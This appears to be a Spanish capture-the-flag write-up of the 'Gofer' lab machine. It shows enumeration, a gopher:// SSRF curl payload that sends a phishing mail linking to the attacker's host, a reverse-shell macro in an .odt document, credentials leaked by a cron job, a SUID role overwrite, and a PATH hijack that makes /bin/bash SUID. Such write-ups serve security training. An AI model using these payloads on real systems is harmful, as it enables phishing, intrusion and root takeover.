-------
- Tags: #odt #macros #gopher #smtp #cron-job #reversing #path-hijacking 
-------------
## Técnicas utilizadas
- Samba enumeration
- Send mail with Gopher [SSRF]
- Create malicious .odt
- Information Leaked in Cron Job
- Overwriting variable
- Path Hijacking
## Procedimiento

![[Pasted image 20230730002828.png]]

----------
#### Reconocimiento
Si lanzamos un **nmap** sobre la maquina, podemos ver estos puertos abiertos:
```ruby
# nmap -sCV -p22,80,139,445 -oN Ports 10.129.4.201
Nmap scan report for 10.129.4.201
Host is up (0.13s latency).

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 aa25826eb804b6a9a95e1a91f09451dd (RSA)
|   256 1821baa7dce44f60d781039a5dc2e596 (ECDSA)
|_  256 a42d0d45132a9e7f867af6f778bc42d9 (ED25519)
80/tcp  open  http        Apache httpd 2.4.56
|_http-server-header: Apache/2.4.56 (Debian)
|_http-title: Did not follow redirect to http://gofer.htb/
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
Service Info: Host: gofer.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2023-07-29T19:02:06
|_  start_date: N/A
|_nbstat: NetBIOS name: GOFER, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
|_clock-skew: -17h00m09s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jul 30 12:02:19 2023 -- 1 IP address (1 host up) scanned in 16.98 seconds
```

Un escaneo con **whatweb** sobre la pagina web, nos muestra que corre estas tecnologías por detras:
```ruby
# whatweb gofer.htb
http://gofer.htb [200 OK] Apache[2.4.56], Bootstrap, Country[RESERVED][ZZ], Email[info@gofer.htb], Frame, HTML5, HTTPServer[Debian Linux][Apache/2.4.56 (Debian)], IP[10.129.4.49], Lightbox, Script, Title[Gofer]
```

--------
#### Samba enumeration
Al intentar listar los recursos compartidos a nivel de red, nos daremos cuenta de que tenemos permisos de lectura, dado que esta permitido hacer uso de una sesión **nula**:
![[nullsession.png]]

Para no estar haciendo uso de **smbmap** o **smbclient** hare uso de monturas:
```
# mount -t cifs //gofer.htb/shares /mnt/shares
```

Dentro, encontramos un correo electronico el cual nos dice que **Jocelyn** ha sido victima de constante ataques de **phishing** y que a pesar de esto, ella sigue abriendo los enlaces. Además, de que ahora el unico formato de documento admitido sera **.odt**, y que para poder enviar correos, se necesitara hacerse de forma local en la red:
![[mail.png]]

-----------
#### Send mail with Gopher [SSRF]
Pues bien, si visitamos la web, no encontramos nada interesante. Aplicando **fuzzing** de directorios y de archivos tampoco llegamos a completamente nada, sin embargo, si **fuzzeamos** por subdominios, encontramos uno interesante:
![[subdomain.png]]

Al visitar este subdominio, de primeras, nos pedira una contraseña y un usuario que por ahora no tenemos. En este punto, podemos intentar **fuzzear** por archivos dentro de este mismo subdominio, solo que no encontramos nada, pero, si lo intentamos con el metodo **POST** encontramos el siguiente archivo:
![[index.png]]

En este punto, la propia maquina nos da una pequeña pista. El nombre es **Gofer** que hace referencia a **Gopher**, si buscamos por esto en **hacktricks** encontramos un articulo que nos da una orientación de que podemos hacer:
![[gopher.png]]

Bien, basicamente podemos hacer uso de **Gopher** para derivar un **SSRF** que nos permita mandar un correo a **Jocelyn** la cual se supone esta pendiente de los correos que les llega. Pero ahora surge un problema, ¿Cual sera el correo de **Jocelyn**? Si bien no lo indica en el correo que leimos, en la misma pagina nos dan un poco de informacion:
![[jennifer.png]]

Asi que el correo, siguiente la nomenclatura que vemos en el email, seria `jhudson@gofer.htb`. Ahora, solo queda preparar el **payload** que mandaremos, en este caso yo usare el mismo ejemplo que viene en [hacktricks](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery)
solo que modificare algunas cosas:
```ruby
curl -s -X POST "http://proxy.gofer.htb/index.php?url=gopher://2130706433:25/xHELO%202130706433%250d%250aMAIL%20FROM%3A%3sexcott@gofer.htb%3E%250d%250aRCPT%20TO%3A%3Cjhudson@gofer.htb%3E%250d%250aDATA%250d%250aFrom%3A%20%5BSexcott%5D%20%3Csexcott@sexcott%3E%250d%250aTo%3A%20%3Cjhudson@gofer.htb%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20Te%20amo%20Jennifer%250d%250a%250d%250a%20%250ahttp://10.10.14.40:80/%250d%250a%250d%250a.%250d%250aQUIT%250d%250a"
```

Basicamente, la data urlencodeada es esta:
```java
xHELO 2130706433
MAIL FROM:<sexcott@gofer.htb>
RCPT TO:<jhudson@gofer.htb>
DATA
From: [Sexcott] <sexcott@sexcott>
To: <jhudson@gofer.htb>
Date: Tue, 15 Sep 2017 17:20:26 -0400
Subject: Te amo Jennifer

 
http://10.10.14.40:80/

.
QUIT
```

Antes de lanzarlo, con python montaremos un servidor para ver si **Jocelyn** hice click en nuestro link:
![[python.png]]

---------------------
#### Create malicious .odt
Ahora al saber que **Jocelyn** esta viendo nuestro enlace y, además, como lo indica en el correo, esta en espera de un archivo **.odt**, solo nos queda montarnos un **.odt** malicioso con una macro por detrás que nos lance una **reverse shell**, esto se explica mucho mejor en este [articulo](https://jamesonhacking.blogspot.com/2022/03/using-malicious-libreoffice-calc-macros.html).

Para hacerlo, podemos seguir estos pasos:
1. Creamos un nuevo documento.
2. Vamos a la pestaña de Tools -> Macros -> Organize Macros -> Basic
3. Seleccionamos nuestro archivo y clickeamos New:
![[newmacro.png]]
5. Indicamos un nombre, el que deseemos.
6. Dentro colocamos nuestro comando malicioso, en este caso, me entablare una reverse shell:
![[macro.png]]
7. Tecleamos `ctrl + s` y guardamos el archivo donde queramos.
8. Vamos a Tools -> Customize -> Open Document -> Macro y dentro selecionamos nuestro macro y le damos OK:
![[assigmentMacro.png]]

9. Lo guardamos y listo, ya tenemos nuestro **.odt** malicioso

Con nuestro **.odt** creado, montamos un servidor con **python** y nos ponemos en escucha con **nc**. Mandamos el correo haciendo referencia a nuestro archivo **.odt**:
```ruby
curl -s -X POST "http://proxy.gofer.htb/index.php?url=gopher://2130706433:25/xHELO%202130706433%250d%250aMAIL%20FROM%3A%3sexcott@gofer.htb%3E%250d%250aRCPT%20TO%3A%3Cjhudson@gofer.htb%3E%250d%250aDATA%250d%250aFrom%3A%20%5BSexcott%5D%20%3Csexcott@sexcott%3E%250d%250aTo%3A%20%3Cjhudson@gofer.htb%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20Te%20amo%20Jennifer%250d%250a%250d%250a%20%250ahttp://10.10.14.40:80/pwned.odt%250d%250a%250d%250a.%250d%250aQUIT%250d%250a"
```

Y obtendriamos la shell y la primera flag:
![[shell.png]]

-----------
#### Information Leaked in Cron Job
Una vez dentro, podemos subir **pspy** y ver que procesos se estan ejecutando en intervalos regulares de tiempo y encontramos uno que se esta autenticando contra el Basic Autentication:
![[cronjon.png]]

con estas credenciales nos podemos conectar por **ssh** como **tbuckley**.

--------
#### Overwriting variable
Si listamos los grupos a los cuales pertenecemos, vemos que formamos parte de **dev**:
```
tbuckley@gofer:~$ id
uid=1002(tbuckley) gid=1002(tbuckley) groups=1002(tbuckley),1004(dev)
tbuckley@gofer:~$ 
```

Filtrando por archivos que pertenezcan a este grupo, encontramos un **SUID**:
```
tbuckley@gofer:~$ find / -group dev 2>/dev/null
/usr/local/bin/notes
tbuckley@gofer:~$ 
```

Aplicandando un poco de reversing con **Ghidra** vemos algo interesante:
![[binary.png]]

Esto, basicamente esta haciendo una comparación. Esta comparando que despues de 24 caracteres ( 0x18 es 24 en decimal ) exista una cadena con valor **admin**. Podemos abusar de esto dado que, si creamos un usuario, lo eliminamos, creamos una nota y despues verificamos nuestro rol este abra desaparecido:
![[roldontfind.png]]

Bien, es creando una nota cuando podemos sobreescribir el **Role**. Lo unico que tendriamos que hacer es colocar una cadena con una logitud de 24 caracteres y despues de esto colocar **"admin"**:
![[role.png]]

------------
#### Path Hijacking
Ahora como admin, tenemos la opción de crear un **backup** de las notas. Esto, es vulnerable a secuesto de **Path** dado que no hace alución a una ruta **absoluta** como lo vemos en el codigo:
![[tar.png]]

Creamos un archivo en **/tmp/** con nombre **tar** y dentro de este asignamos **SUID** a la **bash**:
```bash 
#!/bin/bash
chmod u+s /bin/bash
```

Exportamos el nuevo path de la siguiente forma:
```
tbuckley@gofer:~$ export PATH=/tmp:$PATH
tbuckley@gofer:~$ echo $PATH
/tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
```

Ahora, al crear un backup en vez de tirar de **tar** lo hara de nuestro archivo malicioso y le asignara privilegios **SUID** a la bash:
![[bashSuid.png]]


